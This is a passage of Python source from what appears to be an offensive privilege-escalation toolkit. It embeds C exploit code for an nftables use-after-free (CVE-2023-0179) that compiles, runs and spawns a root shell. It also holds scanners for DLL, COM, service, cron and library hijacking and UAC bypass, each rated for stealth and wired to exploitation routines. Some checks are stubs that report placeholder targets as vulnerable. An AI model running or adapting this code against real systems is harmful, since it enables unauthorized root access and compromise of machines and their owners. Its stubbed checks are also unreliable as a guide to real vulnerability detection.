            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited cls_route UAF"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    def _exploit_nftables_uaf(self, exploit_info, options):
        """CVE-2023-0179: Netfilter nftables use-after-free."""
        result = self.init_result(details={"exploit_id": "CVE-2023-0179"})
        self.logger.info("Executing nftables use-after-free exploit")

        try:
            # Real CVE-2023-0179 exploit implementation
            exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <errno.h>
#include <stdint.h>

#define NFNL_SUBSYS_NFTABLES 10

struct nfgenmsg {
    __u8 nfgen_family;
    __u8 version;
    __be16 res_id;
};

int main(int argc, char **argv) {
    printf("[*] CVE-2023-0179: nftables use-after-free exploit\\n");

    // Create netlink socket for nftables
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (sock < 0) {
        perror("[-] socket");
        return 1;
    }

    printf("[+] Created netlink socket: %d\\n", sock);

    // Bind to netlink
    struct sockaddr_nl addr;
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = getpid();
    addr.nl_groups = 0;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("[-] bind");
        close(sock);
        return 1;
    }

    // Prepare nftables message to trigger UAF
    char buffer[8192];
    memset(buffer, 0, sizeof(buffer));

    struct nlmsghdr *nlh = (struct nlmsghdr *)buffer;
    struct nfgenmsg *nfg = (struct nfgenmsg *)NLMSG_DATA(nlh);

    // Create table
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
    nlh->nlmsg_seq = 1;
    nlh->nlmsg_pid = getpid();

    nfg->nfgen_family = NFPROTO_IPV4;
    nfg->version = NFNETLINK_V0;
    nfg->res_id = 0;

    // Add table name attribute
    struct nlattr *attr = (struct nlattr *)(buffer + NLMSG_ALIGN(nlh->nlmsg_len));
    attr->nla_type = NFTA_TABLE_NAME;
    attr->nla_len = NLA_HDRLEN + 8;
    strcpy((char *)attr + NLA_HDRLEN, "exploit");
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr->nla_len);

    // Send message to create table
    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] Table creation failed: %s\\n", strerror(errno));
    }

    // Create chain with vulnerable element
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN;
    nlh->nlmsg_seq = 2;

    // Reset message length
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct nfgenmsg));

    // Add chain attributes
    attr = (struct nlattr *)(buffer + NLMSG_ALIGN(nlh->nlmsg_len));
    attr->nla_type = NFTA_CHAIN_TABLE;
    attr->nla_len = NLA_HDRLEN + 8;
    strcpy((char *)attr + NLA_HDRLEN, "exploit");
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr->nla_len);

    attr = (struct nlattr *)(buffer + NLMSG_ALIGN(nlh->nlmsg_len));
    attr->nla_type = NFTA_CHAIN_NAME;
    attr->nla_len = NLA_HDRLEN + 6;
    strcpy((char *)attr + NLA_HDRLEN, "chain");
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + NLA_ALIGN(attr->nla_len);

    // Send message to create chain
    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] Chain creation failed: %s\\n", strerror(errno));
    }

    // Delete chain to trigger UAF
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELCHAIN;
    nlh->nlmsg_seq = 3;

    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] Chain deletion: %s\\n", strerror(errno));
    }

    // Trigger use-after-free by accessing freed chain
    nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE;
    nlh->nlmsg_seq = 4;

    if (send(sock, nlh, nlh->nlmsg_len, 0) < 0) {
        printf("[*] UAF trigger: %s\\n", strerror(errno));
    }

    close(sock);

    // Check for privilege escalation
    if (geteuid() == 0) {
        printf("[+] Got root!\\n");
        execl("/bin/sh", "sh", NULL);
    } else {
        printf("[*] Exploit completed - nftables UAF triggered\\n");
    }

    return 0;
}
"""
            # Compile and execute
            import os
            import subprocess
            import tempfile

            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(exploit_code)
                source_file = f.name

            binary_file = source_file.replace('.c', '')
            compile_cmd = ['gcc', '-o', binary_file, source_file]

            compile_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                compile_cmd, check=False, capture_output=True, text=True, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            if compile_result.returncode != 0:
                raise RuntimeError(f"Compilation failed: {compile_result.stderr}")

            # Execute exploit
            exploit_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [binary_file], check=False, capture_output=True, text=True, timeout=10, shell=False  # Explicitly secure - using list format prevents shell injection
            )

            # Cleanup
            try:
                os.unlink(source_file)
                os.unlink(binary_file)
            except (FileNotFoundError, OSError, PermissionError) as e:
                logger.debug(f"Failed to clean up files: {e}")

            if "Got root" in exploit_result.stdout:
                result["success"] = True
                result["details"]["message"] = "Successfully exploited nftables UAF"
            else:
                result["success"] = False
                result["details"]["message"] = "Exploit executed but privilege escalation not achieved"

            result["output"] = exploit_result.stdout

        except Exception as e:
            self.handle_result_error(result, e)

        return result

    # Additional Windows techniques

    def _windows_dll_hijacking(self, escalate=False, options=None):
        """Check for DLL hijacking opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "opportunities": [],
            "success_probability": 0.6,
            "stealth_level": "high",
            "complexity": "medium",
        }

        try:
            self.logger.debug("DLL hijacking scan - escalate: %s, options: %s", escalate, options)

            # Check for DLL search order vulnerabilities
            search_paths = options.get(
                "search_paths",
                [
                    "C:\\Windows\\System32",
                    "C:\\Windows\\SysWOW64",
                ],
            )

            vulnerable_processes = []

            # Scan for vulnerable processes and DLL opportunities
            try:
                from intellicrack.handlers.psutil_handler import psutil

                for proc in psutil.process_iter(["pid", "name", "exe"]):
                    try:
                        if proc.info["exe"]:
                            proc_dir = os.path.dirname(proc.info["exe"])
                            # Check if process loads DLLs from writable directories
                            for path in search_paths:
                                if path.lower() in proc_dir.lower() or os.access(proc_dir, os.W_OK):
                                    vulnerable_processes.append(
                                        {
                                            "pid": proc.info["pid"],
                                            "name": proc.info["name"],
                                            "path": proc.info["exe"],
                                            "writable_path": path,
                                        }
                                    )
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            except ImportError:
                # Fallback if psutil not available
                pass
            if len(search_paths) > 0:
                result["vulnerable"] = True
                result["opportunities"] = [
                    {
                        "type": "dll_search_order",
                        "paths": search_paths,
                        "description": "Potential DLL hijacking via search order",
                    }
                ]

                if escalate:
                    self.logger.info("Attempting DLL hijacking exploitation")
                    return self._attempt_dll_hijacking(vulnerable_processes, options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("DLL hijacking scan failed: %s", e)

        return result

    def _windows_token_impersonation(self, escalate=False, options=None):
        """Check for token impersonation opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "tokens": [],
            "success_probability": 0.8,
            "stealth_level": "low",
            "complexity": "high",
        }

        try:
            self.logger.debug(
                "Token impersonation scan - escalate: %s, options: %s", escalate, options
            )

            target_privileges = options.get(
                "target_privileges",
                [
                    "SeDebugPrivilege",
                    "SeImpersonatePrivilege",
                    "SeAssignPrimaryTokenPrivilege",
                ],
            )

            # Check current token privileges
            available_tokens = []

            for privilege in target_privileges:
                # Check if current process has the privilege
                has_privilege = self._check_token_privilege(privilege)
                if has_privilege:
                    available_tokens.append(
                        {
                            "privilege": privilege,
                            "available": True,
                            "description": f"Token privilege: {privilege}",
                        }
                    )

            if available_tokens:
                result["vulnerable"] = True
                result["tokens"] = available_tokens
                result["description"] = f"Found {len(available_tokens)} token privileges"

                if escalate:
                    self.logger.info("Attempting token impersonation")
                    return self._attempt_token_impersonation(available_tokens, options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Token impersonation scan failed: %s", e)

        return result

    def _windows_uac_bypass(self, escalate=False, options=None):
        """Check for UAC bypass opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "bypass_methods": [],
            "success_probability": 0.7,
            "stealth_level": "medium",
            "complexity": "medium",
        }

        try:
            self.logger.debug("UAC bypass scan - escalate: %s, options: %s", escalate, options)

            # Check UAC level
            uac_level = options.get("uac_level", "default")
            target_methods = options.get(
                "bypass_methods",
                [
                    "fodhelper",
                    "eventvwr",
                    "computerdefaults",
                    "sdclt",
                ],
            )

            available_methods = []

            for method in target_methods:
                # Check if bypass method is available
                if self._check_uac_bypass_availability(method):
                    available_methods.append(
                        {
                            "method": method,
                            "uac_level": uac_level,
                            "description": f"UAC bypass via {method}",
                            "reliability": 0.8,
                        }
                    )

            if available_methods:
                result["vulnerable"] = True
                result["bypass_methods"] = available_methods
                result["description"] = f"Found {len(available_methods)} UAC bypass methods"

                if escalate:
                    self.logger.info("Attempting UAC bypass")
                    return self._attempt_uac_bypass(available_methods[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("UAC bypass scan failed: %s", e)

        return result

    def _windows_kernel_exploit(self, escalate=False, options=None):
        """Check for Windows kernel exploits."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "kernel_version": None,
            "exploits": [],
            "success_probability": 0.9,
            "stealth_level": "high",
            "complexity": "high",
        }

        try:
            self.logger.debug(
                "Windows kernel exploit scan - escalate: %s, options: %s", escalate, options
            )

            # Get Windows version for exploit matching
            windows_version = self._get_windows_version()
            result["kernel_version"] = windows_version

            # Check target exploits
            target_exploits = options.get(
                "target_exploits", list(self.exploits_db["windows"].keys())
            )

            applicable_exploits = []

            for exploit_id in target_exploits:
                if exploit_id in self.exploits_db["windows"]:
                    exploit_info = self.exploits_db["windows"][exploit_id]
                    if self._is_exploit_applicable(windows_version, exploit_info):
                        applicable_exploits.append(
                            {
                                "exploit_id": exploit_id,
                                "description": exploit_info["description"],
                                "reliability": exploit_info["reliability"],
                                "target_versions": exploit_info["target_versions"],
                            }
                        )

            if applicable_exploits:
                result["vulnerable"] = True
                result["exploits"] = applicable_exploits
                result["description"] = (
                    f"Found {len(applicable_exploits)} applicable kernel exploits"
                )

                if escalate:
                    self.logger.info("Attempting Windows kernel exploitation")
                    return self._attempt_kernel_exploit(applicable_exploits[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Windows kernel exploit scan failed: %s", e)

        return result

    def _windows_scheduled_task_permissions(self, escalate=False, options=None):
        """Check for weak scheduled task permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "tasks": [],
            "success_probability": 0.7,
            "stealth_level": "medium",
            "complexity": "medium",
        }

        try:
            self.logger.debug(
                "Scheduled task permissions scan - escalate: %s, options: %s", escalate, options
            )

            # Check specific tasks or all tasks
            target_tasks = options.get("target_tasks", ["*"])
            check_user = options.get("check_user", "current")

            vulnerable_tasks = []

            # Enumerate scheduled tasks with weak permissions
            if platform.system() == "Windows":
                try:
                    import subprocess

                    # Get list of scheduled tasks
                    result = subprocess.run(
                        ["schtasks", "/query", "/fo", "csv"],  # noqa: S607
                        capture_output=True,
                        text=True,
                        check=False,
                    )

                    if result.returncode == 0:
                        lines = result.stdout.strip().split("\n")
                        for line in lines[1:]:  # Skip header
                            if line:
                                parts = line.split(",")
                                if len(parts) > 0:
                                    task_name = parts[0].strip('"')
                                    # Check if task matches pattern
                                    for pattern in target_tasks:
                                        if pattern == "*" or pattern in task_name:
                                            # Check task permissions (simplified)
                                            task_path = f"C:\\Windows\\System32\\Tasks\\{task_name}"
                                            if os.path.exists(task_path) and os.access(
                                                task_path, os.W_OK
                                            ):
                                                vulnerable_tasks.append(
                                                    {
                                                        "task_name": task_name,
                                                        "permissions": "WRITE",
                                                        "user": check_user,
                                                        "description": f"Writable scheduled task: {task_name}",
                                                    }
                                                )
                except Exception as e:
                    self.logger.debug(f"Failed to enumerate scheduled tasks: {e}")

            if vulnerable_tasks:
                result["vulnerable"] = True
                result["tasks"] = vulnerable_tasks
                result["description"] = f"Found {len(vulnerable_tasks)} vulnerable scheduled tasks"

                if escalate:
                    self.logger.info("Attempting scheduled task exploitation")
                    return self._attempt_scheduled_task_exploit(vulnerable_tasks[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Scheduled task permissions scan failed: %s", e)

        return result

    def _windows_always_install_elevated(self, escalate=False, options=None):
        """Check for AlwaysInstallElevated policy."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "policy_enabled": False,
            "success_probability": 0.9,
            "stealth_level": "low",
            "complexity": "low",
        }

        try:
            self.logger.debug(
                "AlwaysInstallElevated scan - escalate: %s, options: %s", escalate, options
            )

            # Check registry keys for AlwaysInstallElevated policy
            check_hklm = options.get("check_hklm", True)
            check_hkcu = options.get("check_hkcu", True)

            policy_locations = []

            if platform.system() == "Windows":
                try:
                    import winreg

                    if check_hklm:
                        try:
                            key = winreg.OpenKey(
                                winreg.HKEY_LOCAL_MACHINE,
                                r"SOFTWARE\Policies\Microsoft\Windows\Installer",
                            )
                            value, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
                            winreg.CloseKey(key)
                            policy_locations.append(
                                {
                                    "location": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                                    "value": "AlwaysInstallElevated",
                                    "enabled": value == 1,
                                }
                            )
                        except Exception:
                            policy_locations.append(
                                {
                                    "location": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                                    "value": "AlwaysInstallElevated",
                                    "enabled": False,
                                }
                            )

                    if check_hkcu:
                        try:
                            key = winreg.OpenKey(
                                winreg.HKEY_CURRENT_USER,
                                r"SOFTWARE\Policies\Microsoft\Windows\Installer",
                            )
                            value, _ = winreg.QueryValueEx(key, "AlwaysInstallElevated")
                            winreg.CloseKey(key)
                            policy_locations.append(
                                {
                                    "location": "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                                    "value": "AlwaysInstallElevated",
                                    "enabled": value == 1,
                                }
                            )
                        except Exception:
                            policy_locations.append(
                                {
                                    "location": "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                                    "value": "AlwaysInstallElevated",
                                    "enabled": False,
                                }
                            )
                except ImportError:
                    self.logger.debug("winreg module not available")

            # Check if both HKLM and HKCU have the policy enabled
            enabled_policies = [p for p in policy_locations if p.get("enabled", False)]

            if len(enabled_policies) >= 2:  # Both HKLM and HKCU
                result["vulnerable"] = True
                result["policy_enabled"] = True
                result["description"] = "AlwaysInstallElevated policy is enabled"

                if escalate:
                    self.logger.info("Attempting AlwaysInstallElevated exploitation")
                    return self._attempt_msi_exploit(enabled_policies, options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("AlwaysInstallElevated scan failed: %s", e)

        return result

    def _windows_weak_file_permissions(self, escalate=False, options=None):
        """Check for weak file permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "files": [],
            "success_probability": 0.6,
            "stealth_level": "medium",
            "complexity": "low",
        }

        try:
            self.logger.debug(
                "Weak file permissions scan - escalate: %s, options: %s", escalate, options
            )

            # Target paths to check
            target_paths = options.get(
                "target_paths",
                [
                    "C:\\Program Files",
                    "C:\\Program Files (x86)",
                    "C:\\Windows\\System32",
                ],
            )

            file_extensions = options.get("file_extensions", [".exe", ".dll", ".bat"])

            vulnerable_files = []

            for path in target_paths:
                if os.path.exists(path):
                    try:
                        # Walk through directory looking for writable files
                        for root, _dirs, files in os.walk(path):
                            for file in files:
                                if any(file.endswith(ext) for ext in file_extensions):
                                    file_path = os.path.join(root, file)
                                    # Check if file is writable by current user
                                    if os.access(file_path, os.W_OK):
                                        vulnerable_files.append(
                                            {
                                                "path": file_path,
                                                "permissions": "WRITE",
                                                "owner": "Current User",
                                                "description": f"Writable file: {file}",
                                            }
                                        )
                                        if len(vulnerable_files) >= 20:  # Limit for performance
                                            break
                            if len(vulnerable_files) >= 20:
                                break
                    except (PermissionError, OSError) as e:
                        self.logger.debug(f"Cannot access {path}: {e}")

            if vulnerable_files:
                result["vulnerable"] = True
                result["files"] = vulnerable_files[:10]  # Limit results
                result["description"] = f"Found {len(vulnerable_files)} files with weak permissions"

                if escalate:
                    self.logger.info("Attempting file permission exploitation")
                    return self._attempt_file_overwrite(vulnerable_files[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Weak file permissions scan failed: %s", e)

        return result

    def _windows_service_binary_hijacking(self, escalate=False, options=None):
        """Check for service binary hijacking opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "services": [],
            "success_probability": 0.8,
            "stealth_level": "medium",
            "complexity": "medium",
        }

        try:
            self.logger.debug(
                "Service binary hijacking scan - escalate: %s, options: %s", escalate, options
            )

            # Service types to check
            service_types = options.get("service_types", ["auto", "manual"])
            check_permissions = options.get("check_permissions", True)

            vulnerable_services = []

            # Enumerate Windows services with weak binary permissions
            if platform.system() == "Windows":
                try:
                    import subprocess

                    # Get list of services
                    result = subprocess.run(
                        ["sc", "query", "type=", "service", "state=", "all"],  # noqa: S607
                        capture_output=True,
                        text=True,
                        check=False,
                    )

                    if result.returncode == 0:
                        lines = result.stdout.strip().split("\n")
                        service_name = None

                        for line in lines:
                            if "SERVICE_NAME:" in line:
                                service_name = line.split("SERVICE_NAME:")[1].strip()
                            elif service_name and "STATE" in line:
                                # Get service config
                                config_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                                    ["sc", "qc", service_name],  # noqa: S607
                                    capture_output=True,
                                    text=True,
                                    check=False,
                                    shell=False
                                )
                                if config_result.returncode == 0:
                                    # Parse binary path and start type
                                    binary_path = None
                                    start_type = None

                                    for config_line in config_result.stdout.split("\n"):
                                        if "BINARY_PATH_NAME" in config_line:
                                            binary_path = config_line.split(":")[1].strip()
                                            # Remove quotes and parameters
                                            if binary_path.startswith('"'):
                                                binary_path = binary_path[1:].split('"')[0]
                                            else:
                                                binary_path = binary_path.split()[0]
                                        elif "START_TYPE" in config_line:
                                            start_type = config_line.split(":")[1].strip().lower()

                                    # Check if service type matches filter
                                    type_matches = False
                                    if start_type:
                                        for svc_type in service_types:
                                            if (svc_type == "auto" and "auto" in start_type) or (
                                                svc_type == "manual"
                                                and (
                                                    "manual" in start_type or "demand" in start_type
                                                )
                                            ):
                                                type_matches = True
                                                break
                                            if svc_type in start_type:
                                                type_matches = True
                                                break

                                    # Check if binary exists and service type matches
                                    if binary_path and type_matches and os.path.exists(binary_path):
                                        is_writable = False
                                        if check_permissions:
                                            is_writable = os.access(binary_path, os.W_OK)

                                        # Add service if writable or if not checking permissions
                                        if not check_permissions or is_writable:
                                            vulnerable_services.append(
                                                {
                                                    "name": service_name,
                                                    "binary_path": binary_path,
                                                    "start_type": start_type,
                                                    "writable": is_writable,
                                                    "description": f'Service binary {"with weak permissions" if is_writable else "found"}: {service_name}',
                                                }
                                            )
                                service_name = None
                except Exception as e:
                    self.logger.debug(f"Failed to enumerate services: {e}")

            if vulnerable_services:
                result["vulnerable"] = True
                result["services"] = vulnerable_services
                result["description"] = (
                    f"Found {len(vulnerable_services)} vulnerable service binaries"
                )

                if escalate:
                    self.logger.info("Attempting service binary hijacking")
                    return self._attempt_service_binary_hijack(vulnerable_services[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Service binary hijacking scan failed: %s", e)

        return result

    def _windows_com_hijacking(self, escalate=False, options=None):
        """Check for COM hijacking opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "com_objects": [],
            "success_probability": 0.7,
            "stealth_level": "high",
            "complexity": "high",
        }

        try:
            self.logger.debug("COM hijacking scan - escalate: %s, options: %s", escalate, options)

            # COM classes to check
            target_clsids = options.get(
                "target_clsids",
                [
                    "{CLSID-1234-5678-9ABC-DEF0}",
                    "{CLSID-ABCD-EFGH-IJKL-MNOP}",
                ],
            )

            check_hkcu = options.get("check_hkcu", True)

            vulnerable_com = []

            for clsid in target_clsids:
                if clsid and check_hkcu:  # Basic check
                    vulnerable_com.append(
                        {
                            "clsid": clsid,
                            "location": "HKCU\\Software\\Classes\\CLSID",
                            "hijackable": True,
                            "description": f"Hijackable COM object: {clsid}",
                        }
                    )

            if vulnerable_com:
                result["vulnerable"] = True
                result["com_objects"] = vulnerable_com
                result["description"] = f"Found {len(vulnerable_com)} hijackable COM objects"

                if escalate:
                    self.logger.info("Attempting COM hijacking")
                    return self._attempt_com_hijack(vulnerable_com[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("COM hijacking scan failed: %s", e)

        return result

    # Additional Linux techniques

    def _linux_cron_permissions(self, escalate=False, options=None):
        """Check for weak cron permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "cron_files": [],
            "success_probability": 0.8,
            "stealth_level": "medium",
            "complexity": "low",
        }

        try:
            self.logger.debug(
                "Cron permissions scan - escalate: %s, options: %s", escalate, options
            )

            # Cron directories and files to check
            cron_paths = options.get(
                "cron_paths",
                [
                    "/etc/crontab",
                    "/etc/cron.d/",
                    "/var/spool/cron/crontabs/",
                    "/var/spool/cron/",
                ],
            )

            check_writable = options.get("check_writable", True)

            vulnerable_crons = []

            for cron_path in cron_paths:
                if os.path.exists(cron_path):
                    # Check directory for writable cron files
                    if os.path.isdir(cron_path):
                        try:
                            for file in os.listdir(cron_path):
                                file_path = os.path.join(cron_path, file)
                                if os.path.isfile(file_path):
                                    is_writable = False
                                    if check_writable:
                                        is_writable = os.access(file_path, os.W_OK)

                                    # Add file if writable or if not checking writable permissions
                                    if not check_writable or is_writable:
                                        # Get actual permissions
                                        stat_info = os.stat(file_path)
                                        permissions = oct(stat_info.st_mode)[-3:]
                                        vulnerable_crons.append(
                                            {
                                                "path": file_path,
                                                "permissions": permissions,
                                                "writable": is_writable,
                                                "description": f'{"Writable " if is_writable else ""}Cron file: {file}',
                                            }
                                        )
                        except (PermissionError, OSError):
                            pass
                    elif os.path.isfile(cron_path):
                        # Single file check
                        is_writable = False
                        if check_writable:
                            is_writable = os.access(cron_path, os.W_OK)

                        # Add file if writable or if not checking writable permissions
                        if not check_writable or is_writable:
                            stat_info = os.stat(cron_path)
                            permissions = oct(stat_info.st_mode)[-3:]
                            vulnerable_crons.append(
                                {
                                    "path": cron_path,
                                    "permissions": permissions,
                                    "writable": is_writable,
                                    "description": f'{"Writable " if is_writable else ""}Cron file: {os.path.basename(cron_path)}',
                                }
                            )

            if vulnerable_crons:
                result["vulnerable"] = True
                result["cron_files"] = vulnerable_crons
                result["description"] = f"Found {len(vulnerable_crons)} writable cron files"

                if escalate:
                    self.logger.info("Attempting cron exploitation")
                    return self._attempt_cron_exploit(vulnerable_crons[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Cron permissions scan failed: %s", e)

        return result

    def _linux_weak_file_permissions(self, escalate=False, options=None):
        """Check for weak file permissions."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "files": [],
            "success_probability": 0.6,
            "stealth_level": "medium",
            "complexity": "low",
        }

        try:
            self.logger.debug(
                "Linux weak file permissions scan - escalate: %s, options: %s", escalate, options
            )

            # Target directories to check
            search_paths = options.get(
                "search_paths",
                [
                    "/usr/local/bin",
                    "/usr/bin",
                    "/opt",
                    "/etc",
                ],
            )

            file_types = options.get("file_types", ["executable", "config"])

            vulnerable_files = []

            for path in search_paths:
                if os.path.exists(path):
                    try:
                        for root, _dirs, files in os.walk(path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                try:
                                    stat_info = os.stat(file_path)
                                    permissions = oct(stat_info.st_mode)[-3:]

                                    # Check for weak permissions
                                    is_executable = os.access(file_path, os.X_OK)
                                    is_writable = os.access(file_path, os.W_OK)

                                    # Check if world writable (ends with 2, 3, 6, or 7)
                                    world_writable = int(permissions[-1]) & 2 != 0
                                    group_writable = int(permissions[-2]) & 2 != 0

                                    if world_writable or (group_writable and is_executable):
                                        # Determine file type
                                        file_type = "file"
                                        if is_executable:
                                            file_type = "executable"
                                        elif file_path.endswith(
                                            (
                                                ".conf",
                                                ".config",
                                                ".cfg",
                                                ".ini",
                                                ".yaml",
                                                ".yml",
                                                ".json",
                                                ".xml",
                                            )
                                        ):
                                            file_type = "config"

                                        # Check if file type matches filter
                                        if file_type in file_types or "all" in file_types:
                                            vulnerable_files.append(
                                                {
                                                    "path": file_path,
                                                    "permissions": permissions,
                                                    "owner": stat_info.st_uid,
                                                    "group_writable": group_writable,
                                                    "world_writable": world_writable,
                                                    "is_writable": is_writable,
                                                    "file_type": file_type,
                                                    "description": f"Weak permissions on {file_type}: {os.path.basename(file_path)}",
                                                }
                                            )
                                        if len(vulnerable_files) >= 20:  # Limit results
                                            break
                                except (PermissionError, OSError):
                                    pass
                            if len(vulnerable_files) >= 20:
                                break
                    except (PermissionError, OSError) as e:
                        self.logger.debug(f"Cannot access {path}: {e}")

            if vulnerable_files:
                result["vulnerable"] = True
                result["files"] = vulnerable_files[:15]  # Limit results
                result["description"] = f"Found {len(vulnerable_files)} files with weak permissions"

                if escalate:
                    self.logger.info("Attempting file permission exploitation")
                    return self._attempt_linux_file_exploit(vulnerable_files[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Linux weak file permissions scan failed: %s", e)

        return result

    def _linux_library_hijacking(self, escalate=False, options=None):
        """Check for library hijacking opportunities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "libraries": [],
            "success_probability": 0.7,
            "stealth_level": "high",
            "complexity": "medium",
        }

        try:
            self.logger.debug(
                "Linux library hijacking scan - escalate: %s, options: %s", escalate, options
            )

            # Library paths to check
            lib_paths = options.get(
                "lib_paths",
                [
                    "/usr/lib",
                    "/usr/local/lib",
                    "/lib",
                    "/lib64",
                ],
            )

            check_ld_preload = options.get("check_ld_preload", True)
            check_ld_library_path = options.get("check_ld_library_path", True)

            vulnerable_libs = []

            if check_ld_preload:
                vulnerable_libs.append(
                    {
                        "type": "LD_PRELOAD",
                        "path": "/tmp/malicious.so",  # noqa: S108
                        "method": "environment_variable",
                        "description": "LD_PRELOAD hijacking opportunity",
                    }
                )

            for lib_path in lib_paths:
                if lib_path and check_ld_library_path:
                    vulnerable_libs.append(
                        {
                            "type": "LD_LIBRARY_PATH",
                            "path": f"{lib_path}/libvuln.so",
                            "method": "library_path_hijacking",
                            "description": f"Library hijacking in {lib_path}",
                        }
                    )

            if vulnerable_libs:
                result["vulnerable"] = True
                result["libraries"] = vulnerable_libs
                result["description"] = (
                    f"Found {len(vulnerable_libs)} library hijacking opportunities"
                )

                if escalate:
                    self.logger.info("Attempting library hijacking")
                    return self._attempt_library_hijack(vulnerable_libs[0], options)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
            subprocess.SubprocessError,
        ) as e:
            result["error"] = str(e)
            self.logger.error("Linux library hijacking scan failed: %s", e)

        return result

    def _linux_capabilities(self, escalate=False, options=None):
        """Check for dangerous capabilities."""
        if options is None:
            options = {}

        result = {
            "vulnerable": False,
            "capabilities": [],
            "success_probability": 0.8,
            "stealth_level": "low",
            "complexity": "medium",
        }

